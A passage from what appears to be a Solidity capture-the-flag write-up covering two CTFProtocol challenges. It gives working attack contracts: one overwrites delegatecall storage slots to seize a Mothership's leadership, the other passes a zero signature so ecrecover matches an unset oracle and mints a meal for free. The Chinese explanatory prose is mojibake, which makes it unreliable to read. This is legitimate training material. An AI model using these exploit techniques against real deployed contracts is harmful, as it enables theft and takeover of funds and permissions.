class="line"></span><br><span class="line">    /**</span><br><span class="line">     * This SpaceShip model has an advanced module system</span><br><span class="line">     *     Only the captain can upgrade the ship</span><br><span class="line">     */</span><br><span class="line">    function addModule(bytes4 _moduleSig, address _moduleAddress) external &#123;</span><br><span class="line">        require(msg.sender == captain, &quot;You are not our captain&quot;);</span><br><span class="line">        modules[_moduleSig] = _moduleAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // solhint-disable-next-line no-complex-fallback</span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        bytes4 sig4 = msg.sig;</span><br><span class="line"></span><br><span class="line">        address module = modules[sig4];</span><br><span class="line">        require(module != address(0), &quot;invalid module&quot;);</span><br><span class="line"></span><br><span class="line">        // call the module</span><br><span class="line">        // solhint-disable-next-line avoid-low-level-calls</span><br><span class="line">        (bool success,) = module.delegatecall(msg.data);</span><br><span class="line">        if (!success) &#123;</span><br><span class="line">            // return response error</span><br><span class="line">            assembly &#123;</span><br><span class="line">                returndatacopy(0, 0, returndatasize())</span><br><span class="line">                revert(0, returndatasize())</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CleaningModule &#123;</span><br><span class="line">    address private cleaningCompany;</span><br><span class="line"></span><br><span class="line">    function replaceCleaningCompany(address _cleaningCompany) external &#123;</span><br><span class="line">        cleaningCompany = _cleaningCompany;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * ...the rest of the code is lost</span><br><span class="line">     */</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract RefuelModule &#123;</span><br><span class="line">    uint256 private mainRefuelStation;</span><br><span class="line">    uint256[] private alternativeRefuelStationsCodes;</span><br><span class="line"></span><br><span class="line">    function addAlternativeRefuelStationsCodes(uint256 refuelStationCode) external &#123;</span><br><span class="line">        alternativeRefuelStationsCodes.push(refuelStationCode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * ...the rest of the code is lost</span><br><span class="line">     */</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract LeadershipModule &#123;</span><br><span class="line">    function isLeaderApproved(address) external pure &#123;</span><br><span class="line">        revert(&quot;We don&#x27;t want a new leader :(&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * ...the rest of the code is lost</span><br><span class="line">     */</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * ...the rest of the code is lost</span><br><span class="line"> */</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-analysis-9"><a href="#2-analysis-9" class="headerlink" title="2. analysis"></a>2. analysis</h4><blockquote>
<p>è¿™é¢˜å¾ˆæœ‰æ„æ€ï¼Œè€ƒå¯Ÿäº†å¾ˆå¤šç‚¹ï¼š</p>
<ol>
<li>ä»”ç»†åˆ†æé¢˜ç›®ï¼šè¦æƒ³ä½¿<code>hacked</code>å˜æˆtrueï¼Œåªèƒ½é€šè¿‡<code>hack</code>å‡½æ•°ï¼Œè€Œè°ƒç”¨è¯¥å‡½æ•°çš„å‰ææ˜¯æˆä¸º<code>leader</code>ï¼Œ<code>promoteToLeader</code>å‡½æ•°æä¾›äº†å¯è¡Œæ€§ï¼Œä½†æ˜¯éœ€è¦é€šè¿‡ä¸€ç³»åˆ—é™åˆ¶ï¼Œåˆ†æ<code>promoteToLeader</code>å‡½æ•°</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function promoteToLeader(address _leader) external &#123;</span><br><span class="line">    SpaceShip leaderSpaceship = captainRegisteredShip[_leader];</span><br><span class="line"></span><br><span class="line">    // should have a registered ship</span><br><span class="line">    require(address(leaderSpaceship) != address(0), &quot;is not a captain&quot;);</span><br><span class="line"></span><br><span class="line">    // should be approved by other captains</span><br><span class="line">    uint8 len = uint8(fleet.length);</span><br><span class="line">    for (uint8 i; i &lt; len; ++i) &#123;</span><br><span class="line">        SpaceShip spaceship = fleet[i];</span><br><span class="line">        // ignore captain ship</span><br><span class="line">        if (address(spaceship) == address(leaderSpaceship)) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        // should not revert if captain approves the new leader</span><br><span class="line">        LeadershipModule(address(spaceship)).isLeaderApproved(_leader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // remove captain from his ship</span><br><span class="line">    delete captainRegisteredShip[_leader];</span><br><span class="line">    leaderSpaceship.newCaptainPromoted(address(0));</span><br><span class="line"></span><br><span class="line">    leader = _leader;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆæ˜¯æ»¡è¶³<code>captainRegisteredShip[_leader] != address(0)</code>ï¼Œè¦æƒ³æ»¡è¶³è¯¥æ¡ä»¶åªèƒ½é€šè¿‡<code>assignNewCaptainToShip</code>å‡½æ•°ï¼Œåˆ†æ<code>assignNewCaptainToShip</code>å‡½æ•°å¯çŸ¥ï¼Œç¬¬ä¸€å…³åˆ™æ˜¯æ»¡è¶³<code>isFleetMember(SpaceShip(msg.sender))==true</code>ï¼Œäºæ˜¯ä¹ï¼Œçœ‹åˆ°<code>_isFleetMember(SpaceShip spaceship)</code>å‡½æ•°ï¼Œåªæœ‰<code>spaceship</code>è¢«åŠ å…¥åˆ°<code>fleet</code>ä¸­æ‰èƒ½è¿”å›trueï¼Œè€Œ<code>msg.sender</code>æ˜¯æ²¡æœ‰è¢«åŠ å…¥åˆ°<code>fleet</code>ä¸­çš„ï¼Œå”¯ä¸€çš„æ·»åŠ é€”å¾„æ˜¯é€šè¿‡<code>addSpaceShipToFleet</code>å‡½æ•°ï¼Œä½†æ˜¯è¯¥å‡½æ•°åªèƒ½ç”±<code>leader</code>è°ƒç”¨ï¼Œæˆ‘ä»¬çš„åˆè¡·å°±æ˜¯æˆä¸º<code>leader</code>ï¼Œæ‰€ä»¥è¯¥æ–¹æ³•ä¸å¯è¡Œã€‚</p>
<ol start="2">
<li><p>çœ‹åˆ°<code>SpaceShip</code>åˆçº¦ï¼Œ<code>askForNewCaptain</code>å‡½æ•°ä¸­æœ‰è¿™æ ·ä¸€å¥ä»£ç <code>mothership.assignNewCaptainToShip(_newCaptain);</code>ï¼Œæ„å‘³ç€å¯ä»¥é€šè¿‡è¯¥å‡½æ•°è°ƒç”¨<code>MotherShip</code>ä¸­çš„<code>assignNewCaptainToShip</code>ï¼Œå› ä¸ºè¯¥<code>spaceship</code>å¯ä»¥ä»å…¬å¼€çš„<code>fleet</code>ä¸­è·å–å…¶åœ°å€ï¼Œä»è€Œè¿›è¡Œæ“ä½œã€‚</p>
</li>
<li><p>è¦æƒ³æˆåŠŸè°ƒç”¨è¯¥å‡½æ•°ï¼Œéœ€è¦æ»¡è¶³ä¸¤ä¸ªé™åˆ¶æ¡ä»¶ï¼Œ*require(_isCrewMember(msg.sender), â€œNot part of the crewâ€); require(captain &#x3D;&#x3D; address(0), â€œWe have a captain alreadyâ€);<em>è¿™é‡Œå¾ˆå·§å¦™çš„ï¼Œçœ‹åˆ°è¯¥åˆçº¦çš„å›è°ƒå‡½æ•°fallbackï¼Œå…¶å‡½æ•°çš„é€»è¾‘å’Œä»£ç†åˆçº¦ä¸­çš„å›è°ƒå‡½æ•°ç®€ç›´ä¸€æ¨¡ä¸€æ ·ï¼Œåªä¸è¿‡å®ƒåªèƒ½è°ƒç”¨æŸäº›é™å®šçš„å‡½æ•°ï¼Œä½†è¿™æ— æ‰€è°“äº†ï¼Œè¿™å‡ ä¸ªå‡½æ•°å·²ç»å¯ä»¥æ»¡è¶³è¦æ±‚äº†ï¼Œ<code>delegatacall</code>è°ƒç”¨æœ€å®¹æ˜“å‘ç”Ÿçš„å°±æ˜¯æ’æ§½å†²çªä»è€Œå¯¼è‡´çš„è¦†ç›–ã€‚SpaceShipä¸­çš„_isCrewMemberå‡½æ•°ï¼Œéœ€è¦memberä¸ºcrewä¸­çš„æˆå‘˜æ‰è¿”å›trueï¼Œè€Œ<code>RefuelModule</code>åˆçº¦ä¸­çš„<code>addAlternativeRefuelStationsCodes</code>ï¼Œåˆ™ä¸ºæˆ‘æä¾›äº†ä½¿å¾—<code>member</code>æˆä¸ºcrewä¸­çš„ä¸€å‘˜çš„å¯èƒ½æ€§ã€‚å†çœ‹åˆ°CleaningModuleåˆçº¦çš„replaceCleaningCompanyå‡½æ•°ä¸ºä¿®æ”¹captainçš„å€¼æä¾›äº†å¯è¡Œæ€§ã€‚å½“ç„¶ï¼Œè¿˜æœ‰ä¸€ç‚¹å¾ˆé‡è¦å°±æ˜¯è¦å…ˆæˆä¸º<code>captain</code>ï¼Œä¸ºäº†è°ƒç”¨<code>addModule</code>å‡½æ•°ï¼Œå°†<code>modules[LeadershipModule.isLeaderApproved.selector] </code>å¯¹åº”çš„åœ°å€ä¿®æ”¹ä¸º<code>hacker</code>çš„åœ°å€ï¼Œå…¶ç›®çš„æ˜¯ä¸ºäº†æˆåŠŸ</em>MotherShipä¸­promoteToLeaderå‡½æ•°ä¸­çš„<code>LeadershipModule(address(spaceship)).isLeaderApproved(_leader);</code>*ï¼Œå› ä¸ºåŸå§‹çš„LeadershipModuleä¸­çš„è¯¥å‡½æ•°ä¸èƒ½è°ƒç”¨æˆåŠŸï¼Œæ‰€ä»¥è¿™é‡Œæœ‰ç‚¹ç¹çï¼Œéœ€è¦é€šè¿‡forå¾ªç¯å°†fleetä¸­çš„5ä¸ªLeadershipModuleå…¨éƒ¨æ”¹æ‰ã€‚</p>
</li>
<li><p>å®Œæˆä¸Šè¿°æ­¥éª¤ä¹‹åï¼Œhackerå¯ä»¥æˆä¸ºleaderäº†ï¼Œç„¶åè°ƒç”¨hackå‡½æ•°ï¼Œæ”»å‡»è¯¥æ¯èˆ°ã€‚</p>
</li>
</ol>
<p>ğŸ“Œ  <em>wocï¼Œåˆ†æå‡ºæ¥ä¹‹åï¼Œç„¶åé…·é…·å†™ä»£ç ï¼Œå†™äº†è¿™ä¹ˆå¤šï¼ï¼ï¼ï¼å±…ç„¶ä¸€æ¬¡å°±hackæˆåŠŸäº†ï¼ï¼ï¼</em></p>
</blockquote>
<h4 id="3-solve-9"><a href="#3-solve-9" class="headerlink" title="3. solve"></a>3. solve</h4><p><strong>æ”»å‡»åˆçº¦</strong></p>
<p><em>æ”»å‡»é€»è¾‘ï¼šå…ˆéƒ¨ç½²LeadershipFakeï¼Œç„¶åéƒ¨ç½²MotherShipï¼Œå°†éƒ¨ç½²å‡ºæ¥çš„mothershipåœ°å€ç”¨äºéƒ¨ç½²MotherShipHackerï¼Œç„¶åå°†LeadshipFakeä¼ å…¥attackå‡½æ•°ä¸­ï¼Œå³å¯å®Œæˆæ”»å‡»ã€‚</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">contract MotherShipHacker &#123;</span><br><span class="line">    </span><br><span class="line">    Mothership  mothership;</span><br><span class="line">    SpaceShip spaceship;</span><br><span class="line"></span><br><span class="line">    constructor(address _mothership) &#123;</span><br><span class="line">        mothership = Mothership(_mothership);</span><br><span class="line">        spaceship = mothership.fleet(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(address leadershipFake) public &#123;</span><br><span class="line"></span><br><span class="line">        // change spaceship&#x27;s LeadershipModule</span><br><span class="line">        for (uint i; i &lt; 5; i++) &#123;</span><br><span class="line">            SpaceShip _spaceship = mothership.fleet(i);</span><br><span class="line">            // become SpaceShip&#x27;s captain</span><br><span class="line">            address(_spaceship).call(abi.encodeWithSelector(CleaningModule.replaceCleaningCompany.selector, address(this)));</span><br><span class="line">            _spaceship.addModule(bytes4(abi.encodeWithSignature(&quot;isLeaderApproved(address)&quot;)), leadershipFake);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* operate the spaceship */</span><br><span class="line">        // change spaceship&#x27;s captain to address(0)</span><br><span class="line">        address(spaceship).call(abi.encodeWithSelector(CleaningModule.replaceCleaningCompany.selector, address(0)));</span><br><span class="line">        // push hacker into crew</span><br><span class="line">        address(spaceship).call(abi.encodeWithSelector(RefuelModule.addAlternativeRefuelStationsCodes.selector, uint(uint160(address(this)))));</span><br><span class="line"></span><br><span class="line">        // call MotherShip&#x27;s assignNewCaptainToShip</span><br><span class="line">        spaceship.askForNewCaptain(address(this));</span><br><span class="line"></span><br><span class="line">        // become MotherShi&#x27;s leader</span><br><span class="line">        mothership.promoteToLeader(address(this));</span><br><span class="line"></span><br><span class="line">        // hack the mothership</span><br><span class="line">        mothership.hack();</span><br><span class="line"></span><br><span class="line">        require(mothership.hacked(), &quot;The mothership is not been hacked...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract LeadershipFake &#123;</span><br><span class="line">    function isLeaderApproved(address) external pure &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/01/Smart%20contracts/CTFProtocol/CTFProtocol/image-20230906183951245.png" alt="image-20230906183951245"></p>
<h3 id="Metaverse-Supermarket"><a href="#Metaverse-Supermarket" class="headerlink" title="Metaverse Supermarket"></a>Metaverse Supermarket</h3><h4 id="1-question-10"><a href="#1-question-10" class="headerlink" title="1.question"></a>1.question</h4><blockquote>
<p>We are all living in the Inflation Metaverse, a digital world dominated by the INFLA token. Stability has become a scarce resource and even going to the store is a painful experience: we need to rely on oracles that sign off-chain data that lasts a couple of blocks because updating prices on-chain would be complete madness.<br>You are out of INFLAs and you are starving, can you defeat the system?</p>
</blockquote>
<p><strong>æºç </strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/25fe191202c44c762bc2a933913e21b37200f0e9/contracts/utils/cryptography/EIP712.sol&quot;;</span><br><span class="line"></span><br><span class="line">struct OraclePrice &#123;</span><br><span class="line">    uint256 blockNumber;</span><br><span class="line">    uint256 price;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct Signature &#123;</span><br><span class="line">    uint8 v;</span><br><span class="line">    bytes32 r;</span><br><span class="line">    bytes32 s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">abstract contract InflaStoreEIP712 is EIP712 &#123;</span><br><span class="line">    bytes32 public constant ORACLE_PRICE_TYPEHASH = keccak256(&quot;OraclePrice(uint256 blockNumber,uint256 price)&quot;);</span><br><span class="line"></span><br><span class="line">    function _hashOraclePrice(OraclePrice memory oraclePrice) internal view returns (bytes32 hash) &#123;</span><br><span class="line">        return _hashTypedDataV4(</span><br><span class="line">            keccak256(abi.encode(ORACLE_PRICE_TYPEHASH, oraclePrice.blockNumber, oraclePrice.price))</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/// @title Metaverse Supermarket</span><br><span class="line">/// @author https://twitter.com/adrianromero</span><br><span class="line">/// @notice We are all living in the Inflation Metaverse, a digital world dominated by the INFLA token. You are out of INFLAs and you are starving, can you defeat the system?</span><br><span class="line">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/metaverse-supermarket</span><br><span class="line">contract InflaStore is InflaStoreEIP712 &#123;</span><br><span class="line">    Meal public immutable meal;</span><br><span class="line">    Infla public immutable infla;</span><br><span class="line"></span><br><span class="line">    address private owner;</span><br><span class="line">    address private oracle;</span><br><span class="line"></span><br><span class="line">    uint256 public constant MEAL_PRICE = 1e6;</span><br><span class="line">    uint256 public constant BLOCK_RANGE = 10;</span><br><span class="line"></span><br><span class="line">    constructor(address player) EIP712(&quot;InflaStore&quot;, &quot;1.0&quot;) &#123;</span><br><span class="line">        meal = new Meal();</span><br><span class="line">        infla = new Infla(player, 10);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setOracle(address _oracle) external &#123;</span><br><span class="line">        require(owner == msg.sender, &quot;!owner&quot;);</span><br><span class="line">        oracle = _oracle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy() external &#123;</span><br><span class="line">        _mintMeal(msg.sender, MEAL_PRICE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buyUsingOracle(OraclePrice calldata oraclePrice, Signature calldata signature) external &#123;</span><br><span class="line">        _validateOraclePrice(oraclePrice, signature);</span><br><span class="line">        _mintMeal(msg.sender, oraclePrice.price);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mintMeal(address buyer, uint256 price) private &#123;</span><br><span class="line">        infla.transferFrom(buyer, address(this), price);</span><br><span class="line">        meal.safeMint(buyer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _validateOraclePrice(OraclePrice calldata oraclePrice, Signature calldata signature) private view &#123;</span><br><span class="line">        require(block.number - oraclePrice.blockNumber &lt; BLOCK_RANGE, &quot;price too old!&quot;);</span><br><span class="line"></span><br><span class="line">        bytes32 oracleHash = _hashOraclePrice(oraclePrice);</span><br><span class="line">        address recovered = _recover(oracleHash, signature.v, signature.r, signature.s);</span><br><span class="line"></span><br><span class="line">        require(recovered == oracle, &quot;not oracle!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _recover(bytes32 digest, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) &#123;</span><br><span class="line">        require(v == 27 || v == 28, &quot;invalid v!&quot;);</span><br><span class="line">        return ecrecover(digest, v, r, s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">import &quot;https://github.com/transmissions11/solmate/blob/c2594bf4635ad773a8f4763e20b7e79582e41535/src/tokens/ERC721.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Meal is ERC721(&quot;Meal&quot;, &quot;MEAL&quot;) &#123;</span><br><span class="line">    address private immutable _owner;</span><br><span class="line">    uint256 private _tokenIdCounter;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function safeMint(address to) external &#123;</span><br><span class="line">        require(_owner == msg.sender, &quot;Only owner can mint&quot;);</span><br><span class="line">        uint256 tokenId = _tokenIdCounter;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            ++_tokenIdCounter;</span><br><span class="line">        &#125;</span><br><span class="line">        _safeMint(to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenURI(uint256) public pure override returns (string memory) &#123;</span><br><span class="line">        return &quot;ipfs://QmQqCFY7Dt9SFgadayt8eeTr7i5XauiswxeLysexbymGp1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">import &quot;https://github.com/transmissions11/solmate/blob/c2594bf4635ad773a8f4763e20b7e79582e41535/src/tokens/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Infla is ERC20(&quot;INFLA&quot;, &quot;INF&quot;, 18) &#123;</span><br><span class="line">    constructor(address player, uint256 amount) &#123;</span><br><span class="line">        _mint(player, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-analysis-10"><a href="#2-analysis-10" class="headerlink" title="2. analysis"></a>2. analysis</h4><blockquote>
<p>è¿™é“é¢˜è¦æ±‚æ˜¯è®©è‡ªå·±ä¸æŒ¨é¥¿ï¼Œä»€ä¹ˆæ„æ€å‘¢ï¼Œå°±æ˜¯æ‹¥æœ‰<code>meal</code>ï¼Œå³ERC721ä»£å¸ä¸ä¸ºé›¶ï¼Œè€Œèƒ½é“¸å¸çš„å‡½æ•°åªæœ‰ä¸¤ä¸ªï¼Œ<code>buy() å’Œ buyUsingOracle()</code>ï¼Œæƒ³è¦â€œåƒé¥­â€å¿…é¡»è¦æœ‰<code>MEAL_PRICE</code>è¿™ä¹ˆå¤šé’±ï¼Œè€Œæˆ‘ä»¬æ‰‹ä¸­çš„é’±è¿œè¿œä¸å¤Ÿï¼Œæ‰€ä»¥ï¼Œåªèƒ½é€šè¿‡<code>buyUsingOracle()</code>å‡½æ•°ã€‚åˆ†æ<code>_validateOraclePrice()</code>å‡½æ•°ï¼Œè¦æ±‚ä¼ å…¥ä¸¤ä¸ªç»“æ„ä½“ï¼Œé€šè¿‡<code>OraclePrice</code>è·å–ç­¾åï¼Œä¸”ç­¾åç»“æœå·²è¢«å›ºå®šç®—æ³•ç”Ÿæˆäº†ï¼Œæ‰€ä»¥è¿™å‡ ä¹æ˜¯ä¸å¯èƒ½é€šè¿‡<code>recover</code>æ¢å¤å‡ºçš„åœ°å€å’Œoracleç›¸åŒï¼ˆ*å½“ç„¶ï¼Œè¿™æ˜¯åœ¨oracleè¢«åˆå§‹åŒ–çš„æƒ…å†µä¸‹ï¼Œä½†å®é™…ä¸Šï¼Œè¯¥oracleå¹¶æ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œå…¶å€¼ä¸º<code>address(0)</code>ï¼‰æ‰€ä»¥ï¼Œè¿™è¦è®©<code>_recover(oracleHash, signature.v, signature.r, signature.s)</code>è¿”å›address(0)å³å¯ã€‚</p>
<p>å¦‚ä½•è¿”å›address(0)å‘¢ï¼Œåªè¦è®©<code>ecrecover</code>åœ¨è®¡ç®—è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯å³å¯è¿”å›<code>address(0)</code>é‚£ä¹ˆè¯¥å¦‚ä½•å‡ºé”™å‘¢ï¼Œ æŸ¥äº†ä¸€ä¸‹èµ„æ–™ï¼Œåªéœ€è®©<code>signature.v ä¸ç­‰äº27æˆ–28ï¼Œæˆ–signature.r=0ï¼Œæˆ–signature.s=0</code>å³å¯ã€‚</p>
<p>è¿˜æœ‰ä¸€ç‚¹ï¼Œå°±æ˜¯æƒ³è¦é€šè¿‡Inflaåˆçº¦ï¼Œè®©playerç»™InflaStoreåˆçº¦æˆæƒï¼Œä¸ºäº†æ‰§è¡Œ<code>infla.transferFrom(buyer, address(this), price);</code>ï¼ŒåŒæ—¶hackeråˆçº¦éœ€è¦å®ç°<code>IERC721Receiver</code>æ¥å£ï¼Œå¦åˆ™ï¼Œ<code> meal.safeMint(buyer);</code>å°†æ— æ³•æ‰§è¡Œã€‚</p>
</blockquote>
<h4 id="3-solve-10"><a href="#3-solve-10" class="headerlink" title="3. solve"></a>3. solve</h4><p><em>æ”»å‡»é€»è¾‘ï¼šå…ˆéƒ¨ç½²hackerï¼Œè®©hackeræˆä¸ºInflaStoreçš„playerï¼Œå†ç„¶åï¼Œè°ƒç”¨attackä¼ å…¥inflastoreï¼Œå³å¯å®Œæˆæ”»å‡»ã€‚</em></p>
<p><strong>æ”»å‡»åˆçº¦</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">interface IERC721Receiver &#123;</span><br><span class="line"></span><br><span class="line">    function onERC721Received(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        uint256 tokenId,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external returns (bytes4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SupermarketHacker is IERC721Receiver &#123;</span><br><span class="line"></span><br><span class="line">    InflaStore store;</span><br><span class="line">    Meal meal;</span><br><span class="line">    Infla infla;</span><br><span class="line">    address hacker;</span><br><span class="line"></span><br><span class="line">    function attack(address _store) public &#123;</span><br><span class="line">        </span><br><span class="line">        // init</span><br><span class="line">        store = InflaStore(_store);</span><br><span class="line">        meal = store.meal();</span><br><span class="line">        hacker = msg.sender;</span><br><span class="line">        infla = store.infla();</span><br><span class="line"></span><br><span class="line">        // create signature</span><br><span class="line">        Signature memory signature = Signature(27, 0, 0);</span><br><span class="line">        // create oracleprice</span><br><span class="line">        OraclePrice memory oracleprice = OraclePrice(block.number, 1);</span><br><span class="line">        // ERC20 approve</span><br><span class="line">        infla.approve(address(store), type(uint).max);</span><br><span class="line">        // mint meal</span><br><span class="line">        store.buyUsingOracle(oracleprice, signature);</span><br><span class="line">        require(meal.balanceOf(address(this)) &gt; 0, &quot;you have not meal, you still stave...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onERC721Received(</span><br><span class="line">        address,</span><br><span class="line">        address,</span><br><span class="line">        uint256,</span><br><span class="line">        bytes calldata</span><br><span class="line">    ) external virtual returns (bytes4) &#123;</span><br><span class="line">        